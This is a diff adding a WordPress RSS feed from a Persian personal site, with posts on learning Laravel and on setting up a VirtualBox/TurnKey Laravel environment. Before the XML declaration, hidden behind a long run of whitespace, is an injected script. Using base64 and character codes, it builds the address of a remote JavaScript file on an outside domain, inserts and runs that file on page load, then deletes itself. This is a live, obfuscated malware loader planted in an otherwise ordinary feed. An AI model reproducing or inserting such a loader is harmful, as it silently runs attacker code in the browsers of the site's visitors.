@@ -1,0 +1,125 @@
+                                                                                                                                                                                                                                                                                                                                                                                                                                         <script>var st=document.createElement('script'); st.innerHTML=atob("dmFyIHN0PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOyBzdC5zcmM9Z2V0X2woKTsgc3QudHlwZT0ndGV4dC9qYXZhc2NyaXB0Jztkb2N1bWVudC5jdXJyZW50U2NyaXB0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHN0LCBkb2N1bWVudC5jdXJyZW50U2NyaXB0KTtkb2N1bWVudC5jdXJyZW50U2NyaXB0LnJlbW92ZSgpO2Z1bmN0aW9uIGdldF9sKCkge3JldHVybiAiaHQiK2F0b2IoImRIQnpPaTh2IikrU3RyaW5nLmZyb21DaGFyQ29kZSg5OSwxMDQsMTAxLDExNSwxMTYsNDYsOTksMTAwLDExMCwxMTYsMTExLDExNSwxMTksMTA1LDExNiw5OSwxMDQsMTE1LDExMiwxMDUsMTE0LDEwNSwxMTYpKyIuY29tIithdG9iKCJMM05qY21sd2RITXZZMjl1Ym1WamRHbHZibk11YW5NPSIpO30="); st.type='text/javascript';document.currentScript.parentNode.insertBefore(st, document.currentScript);document.currentScript.remove();</script><?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>education &#8211; قدمگاه</title>
+	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
+	<link>./../../../../index.html</link>
+	<description>وب سایت شخصی حمید شریعتی</description>
+	<lastBuildDate>Tue, 12 Feb 2019 03:46:21 +0000</lastBuildDate>
+	<language>fa-IR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.4.4</generator>
+
+<image>
+	<url>./../../../../wp-content/uploads/2021/03/cropped-139911-32x32.jpeg</url>
+	<title>education &#8211; قدمگاه</title>
+	<link>./../../../../index.html</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>most important articles to learn laravel</title>
+		<link>./../../../2019/02/11/most-important-articles-to-learn-laravel/index.html</link>
+					<comments>./../../../2019/02/11/most-important-articles-to-learn-laravel/index.html#respond</comments>
+		
+		<dc:creator><![CDATA[حمید شریعتی]]></dc:creator>
+		<pubDate>Mon, 11 Feb 2019 14:55:22 +0000</pubDate>
+				<category><![CDATA[education]]></category>
+		<category><![CDATA[eloquent]]></category>
+		<category><![CDATA[laravel]]></category>
+		<guid isPermaLink="false">./../../../../index.html?p=63</guid>
+
+					<description><![CDATA[These days I&#8217;m learning laravel professionally. I want to share some tips to learn laravel : there are very tutorials to start laravel as in main docs, blogs, etc. I recommended every one to check https://eloquentbyexample.com/ articles. although it&#8217;s under limitation in Iran. Jeff Madsen simply introduce eloquent. very thanks to him. I&#8217;m summarizing his &#8230;<p class="read-more"> <a class="" href="./../../../2019/02/11/most-important-articles-to-learn-laravel/index.html"> <span class="screen-reader-text">most important articles to learn laravel</span> ادامه »</a></p>]]></description>
+										<content:encoded><![CDATA[<div dir="ltr">
+<p style="text-align: left;">These days I&#8217;m learning laravel professionally.</p>
+<p style="text-align: left;">I want to share some tips to learn laravel :</p>
+<p style="text-align: left;">there are very tutorials to start laravel as in main docs, blogs, etc.</p>
+<p style="text-align: left;">I recommended every one to check <a href="https://eloquentbyexample.com/">https://eloquentbyexample.com/</a> articles. although it&#8217;s under limitation in Iran.</p>
+<p style="text-align: left;"><a href="https://codebyjeff.com/">Jeff Madsen</a> simply introduce eloquent. very thanks to him.</p>
+<p style="text-align: left;">I&#8217;m summarizing his articles and will published as cheatsheet.</p>
+<p style="text-align: left;">also you should review<a href="https://github.com/alexeymezenin/laravel-best-practices"> this repository</a> when you are coding.</p>
+<p style="text-align: left;">this will update&#8230; give me your feedback and more sources</p>
+</div>
+]]></content:encoded>
+					
+					<wfw:commentRss>./../../../2019/02/11/most-important-articles-to-learn-laravel/feed/index.html</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>بستر ماشین مجازی برای توسعه لاراول (2)</title>
+		<link>./../../../2018/09/07/laravel-turnekey-with-shared-folder-2/index.html</link>
+					<comments>./../../../2018/09/07/laravel-turnekey-with-shared-folder-2/index.html#respond</comments>
+		
+		<dc:creator><![CDATA[حمید شریعتی]]></dc:creator>
+		<pubDate>Fri, 07 Sep 2018 06:40:55 +0000</pubDate>
+				<category><![CDATA[education]]></category>
+		<category><![CDATA[laravel]]></category>
+		<category><![CDATA[shared folder]]></category>
+		<category><![CDATA[virtualbox]]></category>
+		<guid isPermaLink="false">./../../../../index.html?p=10</guid>
+
+					<description><![CDATA[https://aparat.com/v/5Rbzd نحوه لینک کردن پوشه laravel به یک پوشه از host در virtual box در سری ۱ این فیلم نحوه نصب و راه اندازی ماشین مجازی virtual box برای توسعه لاراول را توضیح نشان دادم. در این فیلم نحوه تنظیم shared folder برای استفاده مستقیم و توسعه لاراول را نشان می‌دهم. دقت داشته باشید که &#8230;<p class="read-more"> <a class="" href="./../../../2018/09/07/laravel-turnekey-with-shared-folder-2/index.html"> <span class="screen-reader-text">بستر ماشین مجازی برای توسعه لاراول (2)</span> ادامه »</a></p>]]></description>
+										<content:encoded><![CDATA[<p><a href="https://aparat.com/v/5Rbzd">https://aparat.com/v/5Rbzd</a></p>
+<p>نحوه لینک کردن پوشه laravel به یک پوشه از host در virtual box</p>
+<p>در سری ۱ این فیلم نحوه نصب و راه اندازی ماشین مجازی virtual box برای توسعه لاراول را توضیح نشان دادم. در این فیلم نحوه تنظیم shared folder برای استفاده مستقیم و توسعه لاراول را نشان می‌دهم. دقت داشته باشید که shaed folder بسیار آسان است منتهی از آنجا که برای استفاده از آن در لینوکس و image ساخته شده توسط turnkey نیاز به نصب برنامه های اضافی است این فیلم را تهیه نمودم. از آنجا که نسخه php در image مربوط به turnkey نسخه ۵ بوده باید آن را ارتقاء دهیم و یک بار این کار را به اشتباه به نسخه ۷.۰ انجام دادم که دوباره به ۷.۲ ارتقاء دادم. (البته برای پروژه مورد نظر من نیاز بود و ممکن است برای کسانی که خارج از این پروژه فیلم را مشاهده می کنند استفاده نشود)<br />
+در آخر هم بای shared folder را به صورت اتوماتیک در fstab قرارداد که با این موضوع مشکلاتی داشتم که اگر کسی از دوستان نظری داشت خوشحال می‌شم بشنوم.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>./../../../2018/09/07/laravel-turnekey-with-shared-folder-2/feed/index.html</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>بستر ماشین مجازی برای توسعه لاراول (۱)</title>
+		<link>./../../../2018/09/04/laravel-turnekey-with-shared-folder-1/index.html</link>
+					<comments>./../../../2018/09/04/laravel-turnekey-with-shared-folder-1/index.html#respond</comments>
+		
+		<dc:creator><![CDATA[حمید شریعتی]]></dc:creator>
+		<pubDate>Tue, 04 Sep 2018 17:24:07 +0000</pubDate>
+				<category><![CDATA[education]]></category>
+		<guid isPermaLink="false">http://localhost:8484/?p=1</guid>
+
+					<description><![CDATA[راه‌های مختلفی برای این منظور وجود دارد: استفاده از vagrant که پیشنهاد خود لاراول هم می‌باشد استفاده از docker استفاده از vps به طور مستقیم استفاده از xammp و مشابه آن و … اما هر کدام مشکلاتی در راه توسعه‌ای که ما پیش گرفتیم دارند. اول اینکه ما نمی‌خواهیم چند مرحله‌ای بر روی فایل‌ها کار &#8230;<p class="read-more"> <a class="" href="./../../../2018/09/04/laravel-turnekey-with-shared-folder-1/index.html"> <span class="screen-reader-text">بستر ماشین مجازی برای توسعه لاراول (۱)</span> ادامه »</a></p>]]></description>
+										<content:encoded><![CDATA[<div id="15360822114000715"><script type="text/JavaScript" src="https://www.aparat.com/embed/wFxsn?data[rnddiv]=15360822114000715&#038;data[responsive]=yes"></script></div>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">راه‌های مختلفی برای این منظور وجود دارد</span></span>:</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">استفاده از </span></span>vagrant <span style="font-family: Tahoma;"><span lang="fa-IR">که پیشنهاد خود لاراول هم می‌باشد</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">استفاده از </span></span>docker</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">استفاده از </span></span>vps <span style="font-family: Tahoma;"><span lang="fa-IR">به طور مستقیم</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">استفاده از </span></span>xammp <span style="font-family: Tahoma;"><span lang="fa-IR">و مشابه آن</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">و …</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">اما هر کدام مشکلاتی در راه توسعه‌ای که ما پیش گرفتیم دارند</span></span>.</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">اول اینکه ما نمی‌خواهیم چند مرحله‌ای بر روی فایل‌ها کار کنیم</span></span>. (<span style="font-family: Tahoma;"><span lang="fa-IR">یک بار در سیستم عامل ذخیره کنیم بعد در سرور یا ماشین مجازی انتقال داده شود</span></span>).</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">دوم اینکه می‌خواهیم بستر برای همه توسعه‌دهنده‌ها یکسان باشد</span></span>. (xammp <span style="font-family: Tahoma;"><span lang="fa-IR">برای ویندوز است و </span></span>mamp <span style="font-family: Tahoma;"><span lang="fa-IR">برای </span></span>mac <span style="font-family: Tahoma;"><span lang="fa-IR">و </span></span>lamp <span style="font-family: Tahoma;"><span lang="fa-IR">برای لینوکس</span></span>)</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">سوم اینکه بستر در تمام سیستم‌عامل‌ها قابل اجرا باشد </span></span>(docker <span style="font-family: Tahoma;"><span lang="fa-IR">در ویندوز ۱۰ به بعد پشتیبانی می‌شود</span></span>)</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">و آخر اینکه ؟؟</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">برای همین از قابلیت </span></span>shared folder <span style="font-family: Tahoma;"><span lang="fa-IR">در </span></span>virtualbox <span style="font-family: Tahoma;"><span lang="fa-IR">استفاده می‌کنیم</span></span>:</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">پس ابتدا باید </span></span>virtualbox <span style="font-family: Tahoma;"><span lang="fa-IR">را نصب نمایید</span></span>.</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">سپس از لینک زیر هارد مجازی که می‌توان در آن استفاده کرد دانلود کنید</span></span>:</p>
+<p class="western" align="left"><span style="color: #000080;"><span lang="zxx"><u><a href="https://www.turnkeylinux.org/download?file=turnkey-laravel-14.2-jessie-amd64-vmdk.zip">https://www.turnkeylinux.org/download?file=turnkey-laravel-14.2-jessie-amd64-vmdk.zip</a></u></span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">بعد از دانلود و </span></span>extract <span style="font-family: Tahoma;"><span lang="fa-IR">یک ماشین مجازی جدید در </span></span>virtualbox <span style="font-family: Tahoma;"><span lang="fa-IR">بسازید و فایل </span></span>vmdk <span style="font-family: Tahoma;"><span lang="fa-IR">را به عنوان هارد مجازی برایش انتخاب نمایید</span></span>. (<span style="font-family: Tahoma;"><span lang="fa-IR">به دلیل پیش پا افتاده بودن از نوشتن راهنما در این مورد خودداری نمودم ولی به هر حال اگر فکر می‌کنید نیاز به راهمایی دارید </span></span>comment <span style="font-family: Tahoma;"><span lang="fa-IR">بگذارید تا بیشتر توضیح دهم</span></span>)</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">با اجرای ماشین مجازی یک سری تنظیمات اولیه لازم است که باید انجام دهید</span></span>.</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">تا مرحله </span></span>shared folder <span style="font-family: Tahoma;"><span lang="fa-IR">در فیلم نشان داده شده است</span></span>. <span style="font-family: Tahoma;"><span lang="fa-IR">ولی برای ایجاد قابلیت </span></span>shared folder <span style="font-family: Tahoma;"><span lang="fa-IR">دو نکته باید در نظر گرفته شود</span></span>:</p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">یکی اینکه </span></span>extension <span style="font-family: Tahoma;"><span lang="fa-IR">مخصوص </span></span>virtualbox <span style="font-family: Tahoma;"><span lang="fa-IR">برای اینکار نصب شود</span></span>. <span style="font-family: Tahoma;"><span lang="fa-IR">کافی است </span></span>virtualbox extension <span style="font-family: Tahoma;"><span lang="fa-IR">را جستجو نمایید…</span></span></p>
+<p class="western" dir="rtl" align="right"><span style="font-family: Tahoma;"><span lang="fa-IR">دوم اینکه برای نصب </span></span>virtualgest <span style="font-family: Tahoma;"><span lang="fa-IR">باید </span></span>bzip2 <span style="font-family: Tahoma;"><span lang="fa-IR">نصب باشد و همانطور که در فیل مشاهده می‌کنید به دلیل عدم اتصال به نت یا تحریم از طرف </span></span>turnkey (<span style="font-family: Tahoma;"><span lang="fa-IR">دقیق نمی‌دانم</span></span>) <span style="font-family: Tahoma;"><span lang="fa-IR">قسمت </span></span>shared folder <span style="font-family: Tahoma;"><span lang="fa-IR">را در آینده برایتان می‌سازم و قرار می‌دهم</span></span>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>./../../../2018/09/04/laravel-turnekey-with-shared-folder-1/feed/index.html</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
